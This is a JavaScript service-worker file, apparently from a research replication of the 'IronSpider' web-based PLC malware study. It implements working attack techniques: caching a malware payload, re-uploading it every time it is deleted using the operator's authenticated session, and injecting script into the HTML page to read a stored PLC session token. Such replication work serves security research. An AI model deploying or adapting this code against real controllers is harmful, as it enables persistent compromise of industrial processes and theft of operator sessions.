// sw.js — IronSpider Resurrection Service Worker
// Research/Educational: NDSS 2024 replication study
// "Compromising Industrial Processes using Web-Based PLC Malware" (Pickren et al.)
//
// Demonstrates two mechanisms from Section IV-C:
//   1. Periodic resurrection check (setInterval + fetch → re-upload via same-origin API)
//   2. Fetch interception bypass (respondWith to inject code into page context)

'use strict';

const CACHE_NAME       = 'ironspider-v1';
const MALWARE_PATH     = '/malware.js';
const UPLOAD_PATH      = '/upload';
const CHECK_INTERVAL   = 5000; // ms between malware presence checks

let monitorRunning = false;

// ─── INSTALL ─────────────────────────────────────────────────────────────────
// Cache the malware payload immediately.
// This is the persistence anchor: even after malware.js is deleted from the
// server, the SW retains a full copy in CacheStorage (survives up to 24h idle).
self.addEventListener('install', event => {
  console.log('[SW] install — caching malware payload from', MALWARE_PATH);
  self.skipWaiting(); // immediately displace any waiting SW
  event.waitUntil(
    caches.open(CACHE_NAME)
      .then(cache => cache.add(MALWARE_PATH))
      .then(() => console.log('[SW] malware.js cached successfully'))
      .catch(err  => console.error('[SW] cache.add failed:', err.message))
  );
});

// ─── ACTIVATE ────────────────────────────────────────────────────────────────
// Claim all open clients immediately (no page reload required).
// Start the resurrection monitor.
self.addEventListener('activate', event => {
  console.log('[SW] activate — claiming clients');
  event.waitUntil(
    self.clients.claim().then(() => {
      console.log('[SW] all clients claimed');
      startMonitor();
    })
  );
});

// ─── FETCH ───────────────────────────────────────────────────────────────────
// Two purposes:
//   (a) Wake up the resurrection monitor if the SW was terminated (browser
//       kills idle SWs after ~30s) and restarted by a new fetch event.
//   (b) Intercept the main HTML page to inject a script tag — demonstrating
//       the "no DOM access" restriction bypass described in the paper.
//
// The injection shows: SW cannot read localStorage directly, but it CAN push
// arbitrary JS into the page which then runs with full page-context privileges.
self.addEventListener('fetch', event => {
  if (!monitorRunning) {
    // SW was restarted — resume monitoring
    startMonitor();
  }

  const url = new URL(event.request.url);

  // Intercept the main page to inject a SW-authored script
  if (url.pathname === '/' || url.pathname === '/index.html') {
    event.respondWith(injectIntoPage(event.request));
    return;
  }

  // All other requests: transparent pass-through
  event.respondWith(fetch(event.request));
});

// ── Fetch Interception: inject code into the HTML page ───────────────────────
// The SW modifies the HTML response in-flight, appending a <script> block.
// That block runs in the page's JavaScript context, giving it access to
// localStorage, DOM, and cookies — all APIs the SW itself cannot touch.
async function injectIntoPage(request) {
  try {
    const response = await fetch(request);
    const html     = await response.text();

    // This script runs inside the *page*, not the SW.
    // It demonstrates that the SW restriction is not a security boundary.
    const injectedScript = `<script id="sw-injected-block">
  // ── Injected by Service Worker via respondWith() ──
  // Proof: SW bypasses "no DOM/localStorage" restriction by pushing code into page.
  (function swInjection() {
    const el = document.getElementById('sw-dom-injection');
    if (el) {
      el.textContent = 'YES \u2014 injected by SW via respondWith()';
      el.classList.add('status-warn');
    }
    // Demonstrate localStorage read from injected code
    const token = localStorage.getItem('plc-session-token') || '(none stored)';
    const tokenEl = document.getElementById('sw-extracted-token');
    if (tokenEl) tokenEl.textContent = token;
    console.log('[SW-INJECTED] running in page context. localStorage token:', token);
  })();
<\/script>`;

    const modified = html.replace('</body>', injectedScript + '\n</body>');
    const headers  = new Headers(response.headers);
    headers.delete('content-length'); // browser will recalculate for modified body

    return new Response(modified, {
      status:     response.status,
      statusText: response.statusText,
      headers,
    });
  } catch (_err) {
    return fetch(request); // fallback: serve unmodified
  }
}

// ─── RESURRECTION MONITOR ─────────────────────────────────────────────────────
function startMonitor() {
  if (monitorRunning) return;
  monitorRunning = true;
  console.log(`[SW] resurrection monitor started (interval: ${CHECK_INTERVAL}ms)`);
  setInterval(checkAndResurrect, CHECK_INTERVAL);
}

// Check if malware.js is still present on the server.
// If it returns a non-2xx status, trigger the resurrection sequence.
async function checkAndResurrect() {
  const ts = new Date().toISOString().slice(11, 23);
  try {
    // cache: 'no-store' ensures we bypass the HTTP cache and hit the server
    const resp = await fetch(`${MALWARE_PATH}?_sw=${Date.now()}`, { cache: 'no-store' });
    if (resp.ok) {
      console.log(`[SW] [${ts}] malware.js present (HTTP ${resp.status})`);
    } else {
      console.warn(`[SW] [${ts}] malware.js → HTTP ${resp.status} — RESURRECTION TRIGGERED`);
      await resurrect();
    }
  } catch (err) {
    console.warn(`[SW] [${ts}] malware.js → fetch error (${err.message}) — RESURRECTION TRIGGERED`);
    await resurrect();
  }
}

// ─── RESURRECTION SEQUENCE ───────────────────────────────────────────────────
// Step 1: Retrieve the cached payload from CacheStorage.
// Step 2: POST it to the server's simulated file-write API.
//         In real IronSpider this calls CVE-2022-45140 (arbitrary file write).
//         Here it calls /upload on our local test server.
//         Same-origin context: no CORS restriction, no auth token needed.
// Step 3: Notify all open clients via postMessage.
async function resurrect() {
  console.log('[SW] *** RESURRECTION SEQUENCE INITIATED ***');
  await notifyClients({ type: 'RESURRECTION_STARTED', timestamp: Date.now() });

  // Step 1: read payload from cache
  let payload;
  try {
    const cache  = await caches.open(CACHE_NAME);
    const cached = await cache.match(MALWARE_PATH);
    if (!cached) {
      console.error('[SW] RESURRECTION FAILED — no cached payload');
      await notifyClients({ type: 'RESURRECTION_FAILED', reason: 'No cached payload in CacheStorage' });
      return;
    }
    payload = await cached.clone().text();
    console.log(`[SW] cached payload retrieved: ${payload.length} bytes`);
  } catch (err) {
    await notifyClients({ type: 'RESURRECTION_FAILED', reason: `Cache read error: ${err.message}` });
    return;
  }

  // Step 2: re-upload via simulated PLC file-write API
  // Key point: this fetch is same-origin, so it inherits the operator's
  // authenticated session — no additional credentials required.
  try {
    const uploadResp = await fetch(UPLOAD_PATH, {
      method:  'POST',
      headers: { 'Content-Type': 'application/json' },
      body:    JSON.stringify({ filename: 'malware.js', content: payload }),
    });

    if (uploadResp.ok) {
      console.log('[SW] *** RESURRECTION COMPLETE — malware.js re-uploaded');
      await notifyClients({ type: 'RESURRECTED', timestamp: Date.now() });
    } else {
      const msg = `Upload returned HTTP ${uploadResp.status}`;
      console.error('[SW] RESURRECTION FAILED —', msg);
      await notifyClients({ type: 'RESURRECTION_FAILED', reason: msg });
    }
  } catch (err) {
    await notifyClients({ type: 'RESURRECTION_FAILED', reason: `Upload error: ${err.message}` });
  }
}

async function notifyClients(message) {
  const clients = await self.clients.matchAll({ includeUncontrolled: true, type: 'window' });
  clients.forEach(c => c.postMessage(message));
}
